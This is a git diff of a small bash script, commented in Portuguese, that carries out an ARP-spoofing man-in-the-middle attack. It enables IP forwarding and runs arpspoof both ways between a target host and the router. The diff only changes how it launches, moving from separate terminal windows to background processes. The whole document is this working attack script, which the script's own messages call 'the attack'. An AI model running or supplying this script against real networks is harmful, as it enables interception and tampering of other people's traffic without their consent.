@@ -10,7 +10,7 @@ fi
 INTERFACE=$1
 TARGET_IP=$2
 ROUTER_IP=$3
-TERMINAL=xfce4-terminal
+#TERMINAL=konsole
 
 # Habilitar IP forwarding
 echo "[*] Habilitando IP forwarding..."
@@ -18,8 +18,8 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Executar arpspoof
 echo "[*] Iniciando ARP spoofing..."
-$TERMINAL -- bash -c "arpspoof -i $INTERFACE -t $TARGET_IP $ROUTER_IP; exec bash"
-$TERMINAL -- bash -c "arpspoof -i $INTERFACE -t $ROUTER_IP $TARGET_IP; exec bash"
+bash -c "arpspoof -i $INTERFACE -t $TARGET_IP $ROUTER_IP; exec bash" &
+bash -c "arpspoof -i $INTERFACE -t $ROUTER_IP $TARGET_IP; exec bash" &
 
 # Mensagem de controle
 echo "[*] Pressione Ctrl+C para encerrar o ataque."
